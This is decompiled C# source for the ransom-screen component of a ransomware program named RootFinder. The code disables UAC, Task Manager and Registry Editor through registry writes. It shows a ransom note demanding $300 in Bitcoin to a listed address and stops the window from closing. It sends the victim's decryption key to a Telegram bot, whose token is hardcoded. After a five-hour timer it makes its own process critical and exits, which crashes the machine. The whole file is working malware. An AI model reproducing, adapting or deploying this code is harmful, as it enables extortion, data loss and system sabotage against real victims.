using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;

namespace RootFinder_Ransomware;

public class Form_Message : Form
{
	public string DecKey;

	public string res;

	private static byte[] byte_0;

	private static byte[] byte_1;

	private IContainer icontainer_0;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private TextBox textBox1;

	private Button button1;

	private Label label5;

	private Label label6;

	private Label label7;

	private Timer StburQuk1;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	public Form_Message()
	{
		Class5.qSmkGw9zBHCc6();
		icontainer_0 = null;
		((Form)this)._002Ector();
		InitializeComponent();
		((Control)label7).set_Text(TimeSpan.FromHours(5.0).ToString());
	}

	private void Form_Message_Load(object sender, EventArgs e)
	{
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b1: Expected O, but got Unknown
		_003C_003Ec__DisplayClass4_0 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass4_0();
		CS_0024_003C_003E8__locals0._003C_003E4__this = this;
		DecKey = RandomString(30);
		res = (res = Regex.Replace(EncryptStringToBytes_Aes(DecKey), ".{5}", "$0-"));
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey3.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey4.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		StburQuk1.Start();
		((Control)label3).set_Text("The Files of this computer have been encrypted using a special encryption software, it is certainly impossible for you to recover" + Environment.NewLine + "your data without the private decryption Key, to purchase it, please follow the steps below, if you are going to decrypt your data." + Environment.NewLine + "Perhaps you are busy looking for a way to recover your files, but do not waste your time, nobody can recover your files without" + Environment.NewLine + "the decryption service." + Environment.NewLine + Environment.NewLine + "1. Send $300 of BTC to: 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG" + Environment.NewLine + "2. E-mail testMail.com your BTC Transaction ID, as well as your Personal Installation Key." + Environment.NewLine + "3. Your Personal Installation Key: " + res + Environment.NewLine + "* Use of any 3rd parties will put your files are risk, chances of permenant data loss" + Environment.NewLine + "* It's strongly recommended to keep this windows open.");
		CS_0024_003C_003E8__locals0.startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)CS_0024_003C_003E8__locals0._003C_003E4__this.label7).set_Text((TimeSpan.FromHours(5.0) - (DateTime.Now - CS_0024_003C_003E8__locals0.startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		string messageText = "Message From RootFinder: " + Environment.NewLine + "A Target has been Infected: " + Environment.NewLine + "1. Personal Installation Key: " + res + Environment.NewLine + "2. Personal Decryption Key: " + DecKey;
		Send(messageText);
		Class2.smethod_0();
	}

	public static void Send(string messageText)
	{
		try
		{
			string text = "5629399112:AAFaqGK2MHdOhMITY0ETBomav75ySD4RvrI";
			string text2 = "5834156269";
			string address = "https://api.telegram.org/bot" + text + "/sendMessage?chat_id=" + text2 + "&text=" + messageText;
			using WebClient webClient = new WebClient();
			webClient.DownloadString(address);
		}
		catch
		{
		}
	}

	private void Form_Message_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	public static string RandomString(int length)
	{
		_003C_003Ec__DisplayClass7_0 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass7_0();
		CS_0024_003C_003E8__locals0.random = new Random();
		return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmn0pqrstuvyxyz", length)
			select s[CS_0024_003C_003E8__locals0.random.Next(s.Length)]).ToArray());
	}

	public static string EncryptStringToBytes_Aes(string plainText)
	{
		if (plainText == null || plainText.Length <= 0)
		{
			throw new ArgumentNullException("plainText");
		}
		if (byte_0 == null || byte_0.Length == 0)
		{
			throw new ArgumentNullException("Key");
		}
		if (byte_1 == null || byte_1.Length == 0)
		{
			throw new ArgumentNullException("IV");
		}
		byte[] inArray;
		using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
		{
			aesCryptoServiceProvider.Key = byte_0;
			aesCryptoServiceProvider.IV = byte_1;
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			ICryptoTransform transform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
			using MemoryStream memoryStream = new MemoryStream();
			using (CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
			{
				using StreamWriter streamWriter = new StreamWriter(stream);
				streamWriter.Write(plainText);
			}
			inArray = memoryStream.ToArray();
		}
		return Convert.ToBase64String(inArray);
	}

	public static string DecryptStringFromBytes_Aes(string Text)
	{
		if (Text == null || Text.Length <= 0)
		{
			throw new ArgumentNullException("cipherText");
		}
		if (byte_0 == null || byte_0.Length == 0)
		{
			throw new ArgumentNullException("Key");
		}
		if (byte_1 == null || byte_1.Length == 0)
		{
			throw new ArgumentNullException("IV");
		}
		string result = null;
		byte[] buffer = Convert.FromBase64String(Text.Replace("-", ""));
		using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
		{
			aesCryptoServiceProvider.Key = byte_0;
			aesCryptoServiceProvider.IV = byte_1;
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
			using MemoryStream stream = new MemoryStream(buffer);
			using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
			using StreamReader streamReader = new StreamReader(stream2);
			result = streamReader.ReadToEnd();
		}
		return result;
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void StburQuk1_Tick(object sender, EventArgs e)
	{
		StburQuk1.Stop();
		int int_ = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_, 4);
		Environment.Exit(-1);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text().Contains(DecryptStringFromBytes_Aes(res)))
		{
			((Control)label5).set_Text("The Sectors are being decrypted...");
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
			RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey3.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
			RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey4.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
			Class1.smethod_0();
			Application.Exit();
		}
		else
		{
			((Control)label5).set_Text("Incorrect Key! Please try again.");
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Expected O, but got Unknown
		//IL_01d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01dc: Expected O, but got Unknown
		//IL_026a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0274: Expected O, but got Unknown
		//IL_0407: Unknown result type (might be due to invalid IL or missing references)
		//IL_0411: Expected O, but got Unknown
		//IL_0496: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a0: Expected O, but got Unknown
		//IL_0529: Unknown result type (might be due to invalid IL or missing references)
		//IL_0533: Expected O, but got Unknown
		//IL_06be: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c8: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form_Message));
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		label5 = new Label();
		label6 = new Label();
		label7 = new Label();
		StburQuk1 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Calibri", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(2, 4));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(276, 18));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Oh No! Your Important files are Encrypted...");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Calibri", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(2, 22));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(841, 18));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("=======================================================================================================================");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Calibri", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(2, 40));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(840, 190));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text(componentResourceManager.GetString("label3.Text"));
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Calibri", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Red);
		((Control)label4).set_Location(new Point(0, 291));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(49, 26));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("Key:");
		((Control)textBox1).set_BackColor(Color.Black);
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)0);
		((Control)textBox1).set_Location(new Point(46, 293));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(646, 26));
		((Control)textBox1).set_TabIndex(4);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_ForeColor(Color.Red);
		((Control)button1).set_Location(new Point(709, 293));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(133, 26));
		((Control)button1).set_TabIndex(5);
		((Control)button1).set_Text("Decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Calibri", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Red);
		((Control)label5).set_Location(new Point(3, 248));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(113, 18));
		((Control)label5).set_TabIndex(6);
		((Control)label5).set_Text("Decrypting: False");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Calibri", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.Red);
		((Control)label6).set_Location(new Point(604, 247));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(118, 19));
		((Control)label6).set_TabIndex(7);
		((Control)label6).set_Text("Remaining Time:");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Calibri", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.White);
		((Control)label7).set_Location(new Point(728, 239));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(97, 29));
		((Control)label7).set_TabIndex(8);
		((Control)label7).set_Text("00:00:00");
		StburQuk1.set_Interval(18000000);
		StburQuk1.add_Tick((EventHandler)StburQuk1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(837, 320));
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Name("Form_Message");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("Form_Message");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form_Message_FormClosing));
		((Form)this).add_Load((EventHandler)Form_Message_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static Form_Message()
	{
		Class5.qSmkGw9zBHCc6();
		byte_0 = Encoding.ASCII.GetBytes("qwr{@^h`h&_`50/ja9!'dcmh3!uw<&=?");
		byte_1 = Encoding.ASCII.GetBytes("9/\\~V).A,lY&=t2b");
	}
}
